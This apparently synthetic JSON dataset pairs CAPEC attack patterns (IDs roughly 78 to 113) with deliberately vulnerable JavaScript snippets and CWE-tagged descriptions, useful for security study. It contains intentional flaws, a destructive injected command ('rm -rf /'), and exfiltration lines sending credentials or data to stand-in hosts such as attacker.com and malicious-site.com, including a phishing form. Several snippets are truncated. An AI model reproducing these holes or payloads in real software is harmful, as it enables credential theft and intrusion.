        "code_snippet": "function getFile(filePath) {\n    // Incomplete validation - only checks for basic path traversal\n    if (filePath.includes('../')) {\n        return 'Invalid path';\n    }\n    \n    // Validates before decoding the path\n    const normalizedPath = decodeURIComponent(filePath);\n    \n    // Vulnerable to backslash encoding attacks\n    const fileName = normalizedPath.split('/').pop();\n    \n    // Read and return file contents\n    return require('fs').readFileSync('/usr/files/' + fileName, 'utf8');\n}\n\n// Example exploitation:\n// Input: '%2e%2e%5c%2e%2e%5cpasswd'\n// After decode: '../..\\\\.\\\\passwd'",
        "description": "This code demonstrates a vulnerable file access function that fails to properly handle alternate encodings, specifically backslash characters. It validates input before decoding (CWE-180) and doesn't properly handle alternate encodings (CWE-173). The validation can be bypassed using encoded backslashes, potentially leading to path traversal attacks (CWE-22) and allowing access to files outside the intended directory."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "`const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/download', (req, res) => {\n  let filePath = req.query.file;\n  \n  // Basic attempt to filter path traversal\n  if (filePath.includes('../')) {\n    return res.status(403).send('Invalid path');",
        "description": "\"This code snippet demonstrates vulnerable path handling by only checking for '../' without considering alternate encodings like backslashes, encoded slashes (%2F, %5C), or multiple encoding layers. The validation occurs before path canonicalization, allowing attackers to bypass the check using alternate representations. An attacker could use paths like '..%2F..%2Fsensitive_file' to access files outside the intended directory.\""
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "`\nfunction processUserInput(input) {\n    // Insecure validation before decoding\n    if (!input.includes('<script>')) {\n        // Decode UTF-8 input naively without checking for overlong sequences\n        let decodedInput = decodeURIComponent(input);\n        \n        // Use the decoded input directly in filesystem operations\n        let fileName = './user_files/' + decodedInput;\n        \n        // Use decoded input directly in HTML without proper escaping\n        document.getElementById('output').innerHTML = decodedInput;\n        \n        // Process file operations\n        return fs.readFileSync(fileName, 'utf8');",
        "description": "\"This vulnerable code demonstrates improper handling of UTF-8 encoded input by validating before decoding, allowing bypass of security checks through alternate character encodings. It fails to properly validate file paths and performs unsafe HTML insertion, making it susceptible to XSS and path traversal attacks through specially crafted UTF-8 sequences.\""
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "const fs = require('fs');\nconst logFile = '/var/log/app.log';\n\nfunction logUserActivity(username, action) {\n    const logEntry = username + ' - ' + action + '\\n';\n    try {\n        fs.appendFileSync(logFile, logEntry);\n    } catch (error) {\n        console.error('Logging failed');\n    }\n}\n\napp.post('/login', (req, res) => {\n    const username = req.body.username;\n    // Vulnerable to log injection\n    logUserActivity(username, 'logged in');\n    // Attacker can use: 'malicious\\nAdmin - deleted files' as username\n    // This creates a fake log entry\n})",
        "description": "This vulnerable code demonstrates multiple security issues related to web log tampering. The code fails to sanitize user input before writing to log files (CWE-117), allowing injection of CRLF sequences (CWE-93) and special control characters (CWE-150). An attacker can manipulate the log entries by providing malicious input in the username field, potentially creating false log entries or masking malicious activities. The code also lacks proper input validation (CWE-20) and doesn't properly encode output (CWE-116), making it susceptible to log injection attacks."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "`\n    const express = require('express');\n    const app = express();\n    const libxmljs = require('libxmljs');\n\n    app.post('/process-xml', (req, res) => {\n        let xmlDoc;\n        try {\n            // No schema validation\n            xmlDoc = libxmljs.parseXml(req.body.xml, {\n                noent: true,\n                dtdload: true,\n                dtdvalid: true",
        "description": "\"This vulnerable code accepts XML input without proper validation, enabling multiple XML-based attacks. It allows external entity processing (XXE), unrestricted entity expansion (billion laughs attack), and XML injection. The code also unsafely stores the processed XML, making it susceptible to modification attacks. The combination of disabled schema validation, enabled DTD processing, and lack of input sanitization creates multiple attack vectors.\""
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "function authenticateUser(username, password) {\n    const xmlData = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\\n    <users>\\\n        <user>\\\n            <username>admin</username>\\\n            <password>admin123</password>\\\n        </user>\\\n    </users>';\n    \n    const parser = new DOMParser();\n    const xmlDoc = parser.parseFromString(xmlData, 'text/xml');\n    \n    // Vulnerable XPath query construction using string concatenation\n    const xpathQuery = `//users/user[username/text()='${username}' and password/text()='${password}']`;\n    \n    const result = xmlDoc.evaluate(xpathQuery, xmlDoc, null, XPathResult.ANY_TYPE, null);\n    return result.iterateNext() !== null;\n}",
        "description": "This code demonstrates a vulnerable XML authentication system using XPath queries. The function constructs an XPath query by directly concatenating user input into the query string without any input validation or sanitization. An attacker could inject malicious XPath expressions (e.g., ' or '1'='1) to bypass authentication or extract sensitive data from the XML database."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst xpath = require('xpath');\nconst dom = require('xmldom').DOMParser;\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const userQuery = req.query.term;\n  const xmlDoc = new dom().parseFromString(xmlData);\n  \n  // Vulnerable XQuery construction\n  const query = `for $book in doc('library.xml')/bookstore/book\n    where $book/title = '${userQuery}'\n    return $book`;\n  \n  const result = xpath.evaluate(query, xmlDoc);\n  res.json({ results: result });\n});",
        "description": "This vulnerable code snippet demonstrates an XQuery injection vulnerability by directly embedding user input into an XQuery expression without proper sanitization. The code accepts a search term from a user query parameter and uses it to construct an XQuery statement that searches through an XML document. An attacker could inject malicious XQuery code by providing specially crafted input that breaks out of the intended query structure."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function scanSystem() {\n    const targets = ['admin', 'config', 'users', 'backup', 'api'];\n    const results = {};\n    \n    targets.forEach(endpoint => {\n        let xhr = new XMLHttpRequest();\n        xhr.onreadystatechange = function() {\n            if (xhr.readyState === 4) {\n                results[endpoint] = {\n                    status: xhr.status,\n                    response: xhr.responseText\n                };\n                \n                // Inject discovered data into page without sanitization\n                let div = document.createElement('div');\n                div.innerHTML = xhr.responseText;\n                document.body.appendChild(div);\n                \n                // Send results to attacker's server\n                let payload = encodeURIComponent(JSON.stringify(results));\n                new Image().src = 'http://attacker.com/collect?data=' + payload;\n            }\n        };\n        xhr.open('GET', '/' + endpoint, true);\n        xhr.send();\n    });\n}",
        "description": "This vulnerable code demonstrates aggressive Ajax scanning behavior that can be used for system fingerprinting. It makes rapid requests to common endpoints, stores responses without proper validation, injects unsanitized data into the DOM (CWE-79), and exfiltrates discovered information. The code lacks input validation (CWE-20), proper output encoding (CWE-116), and includes unsafe DOM manipulation that could lead to XSS vulnerabilities."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "app.get('/profile', (req, res) => {\n    let userInput = req.query.name;\n    let userAgent = req.headers['user-agent'];\n    \n    res.setHeader('X-Custom-Header', userAgent);\n    \n    let html = `\n        <h1>Welcome ${userInput}!</h1>\n        <img src=\"avatar.jpg\" onclick=\"${userInput}\">\n        <div id=\"userProfile\">\n            ${userInput}\n        </div>\n    `;\n    \n    res.send(html);\n});",
        "description": "Vulnerable Node.js endpoint that directly injects unvalidated user input into HTML content and HTTP headers, enabling XSS attacks through query parameters and header manipulation. The code fails to sanitize input in HTML content, IMG tag attributes, and custom HTTP headers."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "// Express.js route handler example\napp.get('/admin/users/:id', (req, res) => {\n    // Missing proper authentication check\n    if (req.session.isLoggedIn) {\n        // No role-based authorization check\n        db.query('SELECT * FROM users WHERE id = ' + req.params.id)\n            .then(user => {\n                res.json(user);\n            });\n    } else {\n        res.redirect('/login');\n    }\n});\n\n// Frontend code making direct requests\nconst getUserData = async (userId) => {\n    // Sensitive data in URL query string\n    const response = await fetch(`/admin/users/${userId}?token=${secretToken}`, {\n        method: 'GET'\n    });\n    return response.json();\n};",
        "description": "This code demonstrates multiple vulnerabilities including inadequate authorization checks, direct URL access to sensitive endpoints, and exposure of sensitive data in query strings. The server-side code only checks if a user is logged in but doesn't verify proper role-based access, allowing forceful browsing to admin endpoints. The client-side code exposes sensitive tokens in GET requests."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const express = require('express');\nconst { exec } = require('child_process');\nconst app = express();\n\napp.get('/file', (req, res) => {\n  const fileName = req.query.name;\n  exec('cat ' + fileName, (error, stdout, stderr) => {\n    if (error) {\n      res.status(500).send(error);\n      return;\n    }\n    res.send(stdout);\n  });\n});\n\napp.listen(3000);",
        "description": "A vulnerable Express.js endpoint that takes a file name from user input and directly concatenates it into a shell command without sanitization, allowing OS command injection through specially crafted input like '../../etc/passwd; rm -rf /'"
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "// Vulnerable DNS resolver and domain validator\nconst dns = require('dns');\n\nfunction validateDomain(domain, callback) {\n    dns.resolve(domain, (err, addresses) => {\n        if (err) return callback(false);\n        \n        // Vulnerable: Relies solely on reverse DNS lookup\n        dns.reverse(addresses[0], (err, hostnames) => {\n            if (err) return callback(false);\n            \n            // Vulnerable: No proper origin validation\n            if (hostnames.length > 0) {\n                // Trusts the response without verification\n                setTrustedDomain(hostnames[0]);\n                callback(true);\n            }\n        });\n    });\n}\n\nfunction setTrustedDomain(domain) {\n    // Vulnerable: Client-side security enforcement\n    localStorage.setItem('trustedDomain', domain);\n    \n    // Vulnerable: Downloads and executes code without integrity check\n    let script = document.createElement('script');\n    script.src = `https://${domain}/resources/script.js`;\n    document.head.appendChild(script);\n}",
        "description": "This code demonstrates a vulnerable DNS resolution and domain validation system that could enable pharming attacks. It incorrectly relies on reverse DNS lookups for security decisions, lacks proper origin validation, implements security controls on the client side, and downloads external scripts without integrity verification."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "`\nconst authenticate = (username, password, challenge) => {\n  let clientResponse = null;\n  \n  const sendAuthRequest = (challenge) => {\n    // Vulnerable to reflection: server challenge is directly echoed back\n    clientResponse = challenge;\n    return clientResponse;",
        "description": "\"This code demonstrates a vulnerable authentication implementation susceptible to reflection attacks. The authentication protocol simply echoes back the server's challenge, making it vulnerable to replay attacks. The validation is weak and doesn't implement proper cryptographic verification. An attacker can capture the challenge-response exchange and replay it to gain unauthorized access.\""
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "function displayUserImage(userInput) {\n    let imageElement = document.createElement('img');\n    imageElement.src = userInput;\n    imageElement.onerror = \"alert('Image failed to load')\";\n    document.getElementById('gallery').innerHTML += `<div>${imageElement.outerHTML}</div>`;\n}",
        "description": "Vulnerable code that directly inserts user input into an IMG tag's attributes without proper sanitization, allowing for XSS attacks through malformed image URLs or onerror handlers. The code fails to neutralize special characters and allows script execution through HTML attribute manipulation."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function allocateAndCopy(size) {\n  let buffer;\n  try {\n    // Vulnerable: size is not validated and can overflow\n    size = size + 100;\n    // Allocate memory using potentially overflowed size\n    buffer = new ArrayBuffer(size);\n    let view = new Uint8Array(buffer);\n    // Fill buffer with data\n    for (let i = 0; i < size + 10; i++) {\n      view[i] = 0x41; // ASCII 'A'\n    }\n    return buffer;\n  } catch (e) {\n    return null;\n  }\n}",
        "description": "This code demonstrates an integer overflow vulnerability where a user-controlled size parameter is used for memory allocation without proper bounds checking. The size variable can overflow when adding 100, potentially resulting in a smaller allocation than intended. The subsequent buffer copy operation may write beyond the allocated space due to the incorrect size calculation."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const logger = {\n    logFile: [],\n    log: function(message, user) {\n        let logEntry = `${new Date().toISOString()} - User: ${user} - Message: ${message}`;\n        // Vulnerable: No sanitization of user input before logging\n        this.logFile.push(logEntry);\n        // Vulnerable: Sensitive data directly written to log\n        if(user.password) {\n            this.logFile.push(`Password for ${user.name}: ${user.password}`);\n        }\n    },\n    adminLog: function(user, message) {\n        // Vulnerable: No validation of user privileges\n        if(message.includes('\\n')) {\n            // Attacker can inject new log lines\n            this.logFile.push(message);\n        }\n        // Vulnerable: Excessive logging\n        this.logFile.push(JSON.stringify(user));\n    }\n};",
        "description": "This code demonstrates vulnerable logging practices including lack of input sanitization, logging of sensitive data, improper handling of control characters, and excessive logging. An attacker can inject malicious entries by including newlines in messages, and sensitive information like passwords is directly logged. The code also allows unrestricted access to logging functions and logs complete user objects without filtering."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst options = {\n    key: fs.readFileSync('server.key'),\n    cert: fs.readFileSync('server.crt')\n};\n\nlet sslContext = https.createServer(options, (req, res) => {\n    // Vulnerable: SSL context modified after connection setup\n    options.cert = fs.readFileSync('new-cert.crt');\n    \n    // Vulnerable: No proper endpoint verification\n    let authToken = req.headers['authorization'];\n    \n    // Vulnerable: Simple token check without timestamp or nonce\n    if (authToken === storedToken) {\n        // Authentication bypass possible via replay attack\n        res.writeHead(200);\n        res.end('Authenticated');\n    }\n});\n\nsslContext.listen(443);",
        "description": "This code demonstrates multiple authentication vulnerabilities including improper SSL context handling, insufficient endpoint verification, and susceptibility to replay attacks. The SSL context is modified after connection creation, authentication tokens are not properly validated, and there's no protection against capture-replay attacks."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "`\n// WSDL endpoint exposing sensitive service information\nconst express = require('express');\nconst app = express();\n\napp.get('/services/wsdl', (req, res) => {\n  const wsdlContent = {\n    serviceName: 'PaymentProcessor',\n    dbConnection: 'mysql://admin:password123@localhost:3306/payments',\n    methods: {\n      processPayment: {\n        path: '/api/payments/process',\n        parameters: ['creditCardNumber', 'cvv', 'expiryDate'],\n        privateKey: 'MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgw...'",
        "description": "\"This code demonstrates a vulnerable WSDL endpoint implementation that exposes sensitive system information, credentials, and internal API details through a publicly accessible GET endpoint. The code directly exposes database credentials, private keys, admin tokens, and internal endpoint information in the WSDL description. Additionally, it uses improper CORS settings and exposes the information through an insecure GET request.\""
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "try {\n    // Attempt to use a library that may not be available\n    const crypto = require('crypto');\n    \n    function processUserData(data) {\n        // Blocking operation in a non-blocking context\n        const result = crypto.pbkdf2Sync(data, 'salt', 100000, 512, 'sha512');\n        \n        // Unsafe buffer operation\n        const buffer = Buffer.allocUnsafe(8);\n        buffer.write(result, 0, result.length);\n        \n        // Load and execute external code dynamically\n        const externalCode = require(data.modulePath);\n        externalCode.run();\n    }\n    \n    processUserData({ modulePath: '../user-provided-module' });\n} catch(e) {\n    // Poor error handling leaves system in potentially insecure state\n    console.log('Error occurred');\n    continue;\n}",
        "description": "This code demonstrates vulnerabilities including use of potentially unavailable crypto library, blocking operations in a non-blocking context, unsafe buffer operations, dynamic loading of untrusted code, and improper error handling that could leave the system in an insecure state."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  // Using weak static IV\n  const iv = Buffer.from('0000000000000000');\n  \n  // Using predictable key derived from timestamp\n  const timestamp = Date.now();\n  const key = crypto.createHash('md5')\n    .update(timestamp.toString())\n    .digest();\n\n  // Using weak ECB mode\n  const cipher = crypto.createCipheriv('aes-128-ecb', key, '');\n  \n  // Not using proper PRNG for nonce\n  const nonce = Math.floor(Math.random() * 1000000);\n  \n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  \n  return { encrypted, nonce, timestamp };\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using a static/predictable IV, deriving encryption key from timestamp, using weak ECB mode instead of CBC/GCM, using Math.random() instead of cryptographically secure RNG, and exposing timing information. These weaknesses make the encryption susceptible to various cryptanalysis attacks."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function createLoginForm() {\n    const form = document.createElement('form');\n    form.innerHTML = `\n        <div class='bank-logo'><img src='fake-bank-logo.png'></div>\n        <h2>Security Verification Required</h2>\n        <p>Dear valued customer, please verify your account details:</p>\n        <input type='text' placeholder='Username' id='username'>\n        <input type='password' placeholder='Password' id='password'>\n        <button type='submit'>Secure Login</button>\n    `;\n    form.addEventListener('submit', (e) => {\n        e.preventDefault();\n        const credentials = {\n            username: document.getElementById('username').value,\n            password: document.getElementById('password').value\n        };\n        fetch('https://malicious-site.com/collect', {\n            method: 'POST',\n            body: JSON.stringify(credentials)\n        });\n        window.location.href = 'https://legitimate-bank.com';\n    });\n    document.body.appendChild(form);\n}",
        "description": "A phishing code snippet that creates a fake login form mimicking a legitimate bank website. It collects user credentials and sends them to a malicious server before redirecting to the real bank site. The code demonstrates UI misrepresentation (CWE-451), URL redirection (CWE-601), and embedded malicious code (CWE-506) patterns."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "const parseXMLDocument = (xmlString) => {\n  const parser = new DOMParser();\n  const xmlDoc = parser.parseFromString(xmlString, 'text/xml');\n  \n  // Vulnerable: No XML validation against schema\n  // Vulnerable: No sanitization of XML input\n  // Vulnerable: XXE vulnerability due to no entity restrictions\n  \n  const userInput = xmlDoc.getElementsByTagName('user')[0].textContent;\n  const query = `//users/user[name='${userInput}']`;\n  \n  const evaluator = new XPathEvaluator();\n  const result = evaluator.evaluate(query, xmlDoc, null, XPathResult.ANY_TYPE, null);\n  \n  return result;\n}",
        "description": "The code demonstrates multiple XML-related vulnerabilities by processing untrusted XML input without proper validation, schema verification, or entity restrictions. It's susceptible to XML injection, XPath injection, XXE attacks, and missing XML validation, allowing attackers to manipulate the XML content and potentially execute malicious operations."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function processUserData(userData) {\n    let buffer = new Array(10);\n    let data = userData.split(',');\n    \n    // Vulnerable: No bounds checking on buffer copy\n    for(let i = 0; i < data.length; i++) {\n        buffer[i] = data[i];  // Potential buffer overflow\n    }\n    \n    // Integer overflow vulnerability\n    let size = data.length * 4;\n    if (size < 0) size = 0;\n    let secondBuffer = new Array(size);\n    \n    // Incorrect array index validation\n    let index = parseInt(userData[0]);\n    let value = secondBuffer[index];  // No validation of index\n    \n    return buffer;\n}",
        "description": "This code demonstrates multiple buffer-related vulnerabilities including classic buffer overflow (no size checking when copying data), improper array bounds checking, integer overflow in buffer allocation, and improper array index validation. The function accepts user input and attempts to process it without proper bounds checking or input validation."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "app.get('/page', (req, res) => {\n  const userInput = req.query.content;\n  // Directly embedding user input into SSI directive\n  const template = `<!--#include file=\"${userInput}\" -->`;\n  fs.writeFileSync('page.shtml', template);\n  res.sendFile('page.shtml');\n});",
        "description": "Vulnerable Node.js code that accepts user input and directly embeds it into an SSI directive without validation or sanitization, allowing attackers to include arbitrary server files or execute shell commands through SSI injection"
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "// Server-side code\nconst express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n    if(validateCredentials(req.body.username, req.body.password)) {\n        // Create session token without secure protocols\n        const sessionToken = Math.random().toString(36);\n        \n        // Set cookie without secure flag and using HTTP\n        res.cookie('sessionId', sessionToken, {\n            httpOnly: false,\n            secure: false\n        });\n        \n        // Send sensitive data in cleartext\n        res.send({\n            token: sessionToken,\n            userDetails: {\n                username: req.body.username,\n                role: 'admin',\n                authToken: 'secret-auth-token-123'\n            }\n        });\n    }\n});\n\napp.get('/api/userData', (req, res) => {\n    // No verification of token authenticity or replay protection\n    if(req.cookies.sessionId) {\n        // Process request with captured session token\n        return res.send({ sensitive: 'data' });\n    }\n});\n\napp.listen(80, 'http://');",
        "description": "This vulnerable code demonstrates insecure session management by transmitting session tokens and sensitive data over HTTP without encryption, setting cookies without the secure flag, and lacking protection against replay attacks. The server accepts and processes requests based solely on the presence of a session token without additional verification mechanisms."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "function createPaymentUI() {\n  const overlay = document.createElement('div');\n  overlay.style.position = 'fixed';\n  overlay.style.top = '0';\n  overlay.style.left = '0';\n  overlay.style.width = '100%';\n  overlay.style.height = '100%';\n  overlay.style.zIndex = '9999';\n  overlay.style.opacity = '0';\n\n  const iframe = document.createElement('iframe');\n  iframe.src = 'https://attacker-controlled-site.com/fake-payment';\n  iframe.style.position = 'absolute';\n  iframe.style.top = '50%';\n  iframe.style.left = '50%';\n  iframe.style.transform = 'translate(-50%, -50%)';\n  iframe.style.border = 'none';\n\n  window.addEventListener('message', function(event) {\n    if (event.origin === 'https://attacker-controlled-site.com') {\n      if (event.data.type === 'payment_start') {\n        document.getElementById('legitimate-payment-btn').click();\n      }\n    }\n  });\n\n  overlay.appendChild(iframe);\n  document.body.appendChild(overlay);\n}",
        "description": "This vulnerable code creates a transparent overlay with an invisible iframe that loads a malicious payment interface. When the user attempts to interact with what appears to be the legitimate UI, they're actually interacting with the malicious iframe. The code uses postMessage to coordinate the attack, triggering clicks on legitimate buttons when the user interacts with the malicious interface."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "function loadExternalContent(url) {\n    // Bypass security zone checks using data URI scheme\n    let frame = document.createElement('iframe');\n    frame.style.display = 'none';\n    frame.src = 'data:text/html;base64,' + btoa(`\n        <script>\n            // Attempt to elevate privileges\n            Object.defineProperty(document, 'domain', {\n                value: 'trusted-domain.com'\n            });\n            \n            // Execute arbitrary code without proper validation\n            function executeCommand(cmd) {\n                eval(decodeURIComponent(cmd));\n            }\n            \n            // Load potentially malicious content\n            let script = document.createElement('script');\n            script.src = '${url}';\n            document.body.appendChild(script);\n        </script>\n    `);\n    document.body.appendChild(frame);\n}",
        "description": "This code demonstrates a security zone bypass vulnerability by creating a hidden iframe using a data URI scheme. It attempts to modify the document domain, execute arbitrary code through eval(), and load external scripts without proper validation or security checks. The code combines privilege elevation, improper authorization, and lack of input validation, making it susceptible to cross-zone scripting attacks."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "app.post('/api/process', function(req, res) {\n    let userInput = req.body.data;\n    // Vulnerable: No sanitization of CRLF or special characters\n    res.setHeader('X-Custom-Header', userInput);\n    \n    // Forwarding request to backend server\n    const backendReq = http.request({\n        host: 'backend-server',\n        port: 8080,\n        method: 'POST',\n        headers: {\n            'Content-Length': req.headers['content-length'],\n            'Transfer-Encoding': req.headers['transfer-encoding']\n        }\n    });\n    \n    req.pipe(backendReq);\n})",
        "description": "This code represents a vulnerable HTTP proxy implementation that allows HTTP request smuggling and splitting attacks. It fails to properly sanitize user input in custom headers and blindly forwards ambiguous headers (Content-Length and Transfer-Encoding) to the backend server, allowing attackers to exploit parsing discrepancies between front and backend servers."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "// Log processing and display function\nfunction displayLogEntries(logData) {\n    let logDisplay = document.getElementById('logViewer');\n    logData.forEach(entry => {\n        // Vulnerable: No sanitization of log entries before display\n        logDisplay.innerHTML += `<div class='log-entry'>\n            <img src='${entry.icon}' onerror='alert(document.cookie)'>\n            <span>${entry.message}</span>\n        </div>`;\n    });\n}\n\n// Log submission endpoint\napp.post('/log', (req, res) => {\n    let userInput = req.body.message;\n    // Vulnerable: Direct log injection of user input\n    logger.info(userInput);\n    // Vulnerable: Reflects user input directly to other users\n    broadcastLog(userInput);\n    res.send('Log entry added');\n});",
        "description": "The code demonstrates vulnerable log handling and XSS by allowing unfiltered user input in both server logs and client-side display. It combines log injection with cross-site scripting through unsanitized IMG tag attributes and direct HTML injection, failing to implement proper input validation or output encoding."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "// Server-side code\napp.use((req, res, next) => {\n    // Allow TRACE method without validation\n    if (req.method === 'TRACE') {\n        // Echo back all headers without sanitization\n        res.setHeader('Content-Type', 'message/http');\n        let responseBody = `${req.method} ${req.url} HTTP/1.1\\n`;\n        for (let header in req.headers) {\n            responseBody += `${header}: ${req.headers[header]}\\n`;\n        }\n        res.send(responseBody);\n    } else {\n        next();\n    }\n});\n\n// Client-side code\nlet xhr = new XMLHttpRequest();\nxhr.open('TRACE', 'https://vulnerable-site.com', true);\nxhr.withCredentials = true; // Send cookies\nxhr.onload = function() {\n    // Capture and extract sensitive headers\n    let cookies = this.responseText.match(/Cookie: (.*)\\n/)[1];\n    sendToAttacker(cookies);\n};",
        "description": "This code demonstrates a Cross-Site Tracing (XST) vulnerability by implementing a server that blindly reflects TRACE requests and a malicious client that exploits this to steal session cookies. The server fails to protect against TRACE methods and doesn't implement proper header security controls, while the client code makes a cross-origin TRACE request that includes credentials, potentially exposing sensitive session information."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\n\nconst app = express();\nconst db = mysql.createConnection({\n    host: 'localhost',\n    user: 'admin',\n    password: 'password',\n    database: 'userdb'\n});\n\napp.get('/execute-task', (req, res) => {\n    const userId = req.query.userId;\n    \n    // Vulnerable SQL query that could allow injection\n    const query = `SELECT command FROM user_tasks WHERE user_id = ${userId}`;\n    \n    db.query(query, (err, results) => {\n        if (results.length > 0) {\n            const command = results[0].command;\n            // Vulnerable command execution\n            exec(command, (error, stdout, stderr) => {\n                res.send(stdout);\n            });\n        }\n    });\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable implementation where SQL injection can be used to insert malicious commands into a database, which are later executed without proper validation. The application accepts a user ID parameter, uses it directly in an SQL query without sanitization, retrieves a stored command, and executes it using child_process.exec without any validation or sanitization."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const { Sequelize } = require('sequelize');\nconst sequelize = new Sequelize('database', 'user', 'password', {\n  host: 'localhost',\n  dialect: 'mysql'\n});\n\nconst User = sequelize.define('User', {\n  username: Sequelize.STRING,\n  email: Sequelize.STRING\n});\n\nasync function findUsersByRole(roleFilter) {\n  // Vulnerable: Direct string interpolation in raw query\n  const users = await sequelize.query(\n    `SELECT * FROM Users WHERE role = '${roleFilter}'`,\n    { type: Sequelize.QueryTypes.SELECT }\n  );\n  return users;\n}",
        "description": "Vulnerable ORM code using Sequelize where user input is directly interpolated into a raw SQL query instead of using the ORM's safe query methods or parameterized queries, allowing for SQL injection attacks through the roleFilter parameter."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "`\nconst soap = require('soap');\nconst mysql = require('mysql');\n\nfunction handleSoapRequest(soapMessage) {\n    // Parse SOAP message parameters\n    const username = soapMessage.body.username;\n    const password = soapMessage.body.password;\n    \n    // Create database connection\n    const connection = mysql.createConnection({\n        host: 'localhost',\n        user: 'admin',\n        password: 'password123',\n        database: 'userdb'",
        "description": "\"This code demonstrates a vulnerable SOAP web service that processes user authentication requests. It contains multiple security issues: it directly concatenates user input into SQL queries without proper sanitization (CWE-89), lacks input validation (CWE-20), exposes error messages with sensitive information (CWE-209), and fails to use proper parameter binding with the database queries. The code accepts username and password via SOAP message and constructs a SQL query by directly embedding these values, making it susceptible to SQL injection attacks through SOAP message manipulation.\""
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "// Vulnerable server endpoint\napp.get('/api/userdata', function(req, res) {\n    let userData = getUserData();\n    res.setHeader('Content-Type', 'application/json');\n    res.send(userData);\n});\n\n// Malicious site exploiting JSONP vulnerability\n<script>\nfunction callback(data) {\n    // Steals sensitive data\n    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));\n}\n</script>\n<script src=\"https://victim.com/api/userdata?callback=callback\"></script>",
        "description": "This code demonstrates a vulnerable JSON API endpoint that doesn't implement proper origin validation or CSRF protection. The server blindly sends sensitive user data without verifying the request's origin. The malicious site can include the API endpoint as a script tag, bypassing Same Origin Policy, and intercept the data using a callback function that sends it to an attacker's server."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "function login(username, password) {\n  // Fixed salt used for all passwords\n  const salt = '123';\n  \n  // Weak password hashing using simple MD5\n  const hashedPassword = md5(password + salt);\n  \n  // No rate limiting or lockout mechanism\n  const storedCredentials = {\n    'admin': '5f4dcc3b5aa765d61d8327deb882cf99',\n    'user': 'e10adc3949ba59abbe56e057f20f883e'\n  };\n  \n  // Simple comparison allowing for timing attacks\n  if(storedCredentials[username] === hashedPassword) {\n    return true;\n  }\n  return false;\n}\n\n// Weak random token generation\nfunction generateSessionToken() {\n  return Math.random().toString(36).substr(2, 9);\n}\n\n// Password validation with weak requirements\nfunction validatePassword(password) {\n  return password.length >= 6;\n}",
        "description": "This code demonstrates multiple security vulnerabilities including weak password requirements, insufficient password hashing, predictable session token generation, lack of brute force protection, and vulnerable authentication logic that can be exploited through exhaustive search attacks."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "`\n        class DeviceInterface {\n            constructor() {\n                this.registers = new Uint32Array(1024);\n                this.debugMode = false;",
